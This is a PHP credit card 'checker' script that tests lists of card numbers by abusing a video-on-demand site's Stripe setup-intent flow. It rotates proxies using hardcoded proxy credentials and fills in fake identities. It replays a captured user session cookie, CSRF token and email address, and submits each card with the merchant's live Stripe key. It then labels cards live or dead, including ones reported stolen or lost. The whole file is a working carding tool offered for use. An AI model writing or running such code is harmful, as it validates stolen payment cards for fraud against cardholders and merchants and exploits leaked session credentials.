<?php

error_reporting(0);
date_default_timezone_set('America/New_York');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    $proxySocks4 = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks4) - 1);
    $proxySocks = $proxySocks4[$myproxy];
    return $proxySocks;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink('cookie.txt');
}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

$states = array(
    "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "California" => "CA",
    "Colorado" => "CO", "Connecticut" => "CT", "Delaware" => "DE", "District of Columbia" => "DC",
    "Florida" => "FL", "Georgia" => "GA", "Hawaii" => "HI", "Idaho" => "ID",
    "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
    "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD",
    "Massachusetts" => "MA", "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS",
    "Missouri" => "MO", "Montana" => "MT", "Nebraska" => "NE", "Nevada" => "NV",
    "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM", "New York" => "NY",
    "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
    "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC",
    "South Dakota" => "SD", "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT",
    "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA", "West Virginia" => "WV",
    "Wisconsin" => "WI", "Wyoming" => "WY"
);

$state = isset($states[$state]) ? $states[$state] : "KY";

$ch = curl_init();
///////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'sutlttya-rotate:na9qrfc3lsyz',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead!❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
////////////////////////////===[2ST CURL]
///$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.mossaondemand.net/api/billings/setup_intent?page=payment_methods&currency=usd');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // not recommended for production
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // not recommended for production

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept: application/json',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: en-US,en;q=0.9',
  'Access-Control-Allow-Origin: *',
  'Cookie: referer=; country_code=IN; ip_address=158.173.79.98; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F140.0.0.0+Safari%2F537.36; started_at=2025-10-09+02%3A58%3A46+UTC; initialized=true; bab_locale=en; bab_original=en; lantern=330aaf32-cbd7-4477-b45d-23e205711223; _ga=GA1.1.552842495.1759978729; _fbp=fb.1.1759978729272.964279731109406431; sa-user-id=s%253A0-f53baaf2-1337-530a-6735-e213b9e990df.JqD1TIwTLbtdA9j%252F%252BmD43EV9WUn0riDKWE4NHR5fc8E; sa-user-id-v2=s%253A9Tuq8hM3UwpnNeITuemQ3zHMdak.Yu9pFBakjj5x3PSaZLe%252FDX8s%252F0C10vhu6HkF93Zi9U8; sa-user-id-v3=s%253AAQAKIPO4Red8Z_NVgNISg0IfwjgtAHWBNHGfJKYqGjXCquNnEAEYAyDExNrCBjABOgS0oh7QQgQ5wvN3.gtpXhoQUU%252BV9N8ELYIugXjEhZisX%252BqiHf5F4rPZhXik; bab_block=; __attentive_id=8cfd50086bf34156b7dd6d8866327129; _attn_=eyJ1Ijoie1wiY29cIjoxNzU5OTc4NzMxNTQwLFwidW9cIjoxNzU5OTc4NzMxNTQwLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjhjZmQ1MDA4NmJmMzQxNTZiN2RkNmQ4ODY2MzI3MTI5XCJ9In0=; __attentive_cco=1759978731541; __stripe_mid=c3c12567-6ff1-435f-965a-8d40fd26d4fde37dc1; _hjSessionUser_3134223=eyJpZCI6ImM2NTk4OWNiLWJjMmItNTgyZC04ZTQ0LTk0YTc2YjM0ZWU1MCIsImNyZWF0ZWQiOjE3NTk5Nzg3Mjk2NzcsImV4aXN0aW5nIjp0cnVlfQ==; addshoppers.com=2%7C1%3A0%7C10%3A1759978793%7C15%3Aaddshoppers.com%7C44%3AYTc1MzE3ODE3YWIzNGM3OGFjOWQ1YzI3YTk4YzBiODQ%3D%7C91ea1df55ed8e30af80c35dbe101475f9b24dc6b9d1597cc2cb1b88926464021; attntv_mstore_email=veronique12lacroix@gmail.com:0; uscreen_subscription_status={%22user_id%22:27473766%2C%22user_role%22:%22client%22%2C%22user_country%22:%22IN%22%2C%22former%22:false%2C%22active_subscriber%22:true%2C%22in_trial%22:true%2C%22pending_cancellation%22:false%2C%22on_hold%22:null}; _gcl_au=1.1.381951191.1759978729.1989422295.1760092233.1760092233; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3lOelEzTXpjMk5sMHNJaVF5WVNReE1DUjJWekI0TTFSelZUSk1WMFJPYnpaRGNtaHNjR3RsSWl3aU1UYzJNREE1TWpJMk1DNDBOelE1TmpBNElsMD0iLCJleHAiOiIyMDI1LTEwLTI0VDEwOjMxOjAwLjQ3NFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--3b0b6d37d9938a370c2ce9d907330e093799b2e7; pixel_session=256f938a-62c2-4608-ba17-61c10d69f6f9; _hjSession_3134223=eyJpZCI6IjQ0YmM2YWZkLTM3YTQtNDBjNy04ZDVkLTI0ZGU0YWVlNDBlMyIsImMiOjE3NjA0Mjg3MDQzMjksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; __attentive_session_id=bba91957781d45ae8a04722b63f73611; __attentive_creativeFilter=USCREEN_STATUS_PRESENT; __attentive_ss_referrer=https://www.mossaondemand.net/; __attentive_dv=1; __attentive_pv=3; _uscreen2_session=f6zfTcKjqJiC8JU7aKCTHX1Fd%2BpE7b%2F1ewn3hE70vtwSGRbj%2BbbLaA%2FLuYVcq3lhGRPYDKPJTdkzYDHDhQsAdiCWqCRuQ75KQxAkFQ%2FmGKiVvK8EYqb1Tem8urB7zz3NRApAOMUXAo5mXLWDkYKqkDTLCdry61pwiIWakIwBTQuye%2FlnN64pd9tUIrPum3H5bqYxT5h3xnc1hNIxh45UKJw9STWnim5UhGhQlK%2BrLCawoht8bPKHzkqPHqSby0A4ilWnNtGnbmRO9nURUW2WN71vFlzt7N3JaMRfYOrXcVlQIRhoGJXgct67cuzFzREkiOx6gNhx%2FN4q6i9e73NZ%2B24%2FCzWbdTumheioynjTswmt06C%2B2oPoeSYCRwc49UDFCVNPqnrXca5lNTRONZgrXH%2FzAa6Ylj5pIdvlJvXfIG%2FtVCHVQBI24ak%3D--LPeLxw8VivMoadNn--PCYbm5bws6AIo2wIAg%2FVUg%3D%3D; _ga_8BS785C29N=GS2.1.s1760428712$o3$g1$t1760428787$j60$l0$h1828761879; _ga_1E8M3FJYWM=GS2.1.s1760428700$o3$g1$t1760428787$j60$l0$h0',
  'DNT: 1',
  'Referer: https://www.mossaondemand.net/account/purchases/payment_methods',
  'Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
  'Sec-Ch-Ua-Mobile: ?0',
  'Sec-Ch-Ua-Platform: "Windows"',
  'Sec-Fetch-Dest: empty',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Site: same-origin',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'X-Csrf-Token: csmeSQC73SRQxb4dE_eHCWWJ41xGln8xhu0wMgWHn_I20H3Uxeu8Hg4siYsv2UbqoQNVMoXPUqVD629cfD9yxg'
));

// If needed, save/load cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL Error: ' . curl_error($ch);
    exit;
}

curl_close($ch);

// Decode JSON, don't echo raw response
$response_data = json_decode($response, true);

if (json_last_error() === JSON_ERROR_NONE && isset($response_data['setup_intent'])) {
    $full_intent = $response_data['setup_intent'];
    $intent_id = explode('_secret_', $full_intent)[0];
} else {
    exit; // Stop if setup intent is invalid
}


//request 2

$intent_id = explode('_secret_', $full_intent)[0];

$url = "https://api.stripe.com/v1/setup_intents/{$intent_id}/confirm";

$ch = curl_init();

// Set form fields properly encoded (NOT JSON)
$postFields = http_build_query([
    'payment_method_data[type]' => 'card',
    'payment_method_data[card][number]' => $cc,
    'payment_method_data[card][cvc]' => $cvv,
    'payment_method_data[card][exp_month]' => $mes,
    'payment_method_data[card][exp_year]' => $ano,
    'payment_method_data[guid]' => 'NA',
    'payment_method_data[muid]' => '73f1db21-e00e-4784-a82f-cb771caf51971201c8',
    'payment_method_data[sid]' => 'NA',
    'payment_method_data[payment_user_agent]' => 'stripe.js/047a5472e; stripe-js-v3/047a5472e',
    'payment_method_data[time_on_page]' => '82965',
    'expected_payment_method_type' => 'card',
    'use_stripe_sdk' => 'true',
    'key' => 'pk_live_DImPqz7QOOyx70XCA9DSifxb',
    '_stripe_account' => 'acct_1AkdFjBYMrfIhOMa',
    'client_secret' => $full_intent,
]);

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Set headers once and correctly
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Referer: https://js.stripe.com/',
    'Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile: ?0',
    'Sec-Ch-Ua-Platform: "Windows"',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Accept: application/json',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'DNT: 1',
    'Content-Length: ' . strlen($postFields)
));

// Execute and handle response
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    $result = $response;
}

curl_close($ch);

///$result = curl_exec($ch);



////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){
	
	///if(strpos($result, 'requires_capture')){

  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i></font><br> </i> </font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "requires_capture")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>PREAUTH SUCESS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESS CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESSFULLY AUTHORIZED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "-----BEGIN CERTIFICATE-----" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CCN</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'fraudulent')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CCN1</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>LOST CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=3 color='black'><font class='badge badge-light'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font><br> <font class='badge badge-light'";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "invalid_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INVALID</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN OR LOST</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_month' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID MONTH</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_year' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID YEAR</i> </font><br>";
  }
  elseif(strpos($result, 'Unrecognized request URL (POST: /v1/payment_intents//confirm). If you are trying to list objects, remove the trailing slash. If you are trying to retrieve an object, make sure you passed a valid (non-empty) identifier in your code. Please see https://stripe.com/docs or we can help at https://support.stripe.com/."' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>ERROR IN GATEWAY</i> </font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i> </font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>DO NOT HONOR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result, '"Server Error"')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVER ERROR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CVC_CHECKED : Fail</i> </font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CARD DETAIL</i> </font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT CHECK</i> </font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>VBV</i> </font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>3D SECURED</i> </font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i> </font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i> </font><br>";
}
elseif(strpos($result, "MISSING CARD DETAIL")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING DETAILS</i> </font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'verification_url')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>Card Declined...</i> </font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
///elseif(strpos($result, '"decline_code": "fraudulent"')) {
  ///echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Fraudulent</i> </font><br>";

else {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Server Failure/Error Not Listed</i> </font><br>";
}
curl_close($ch);
ob_flush();
///echo $result;





?>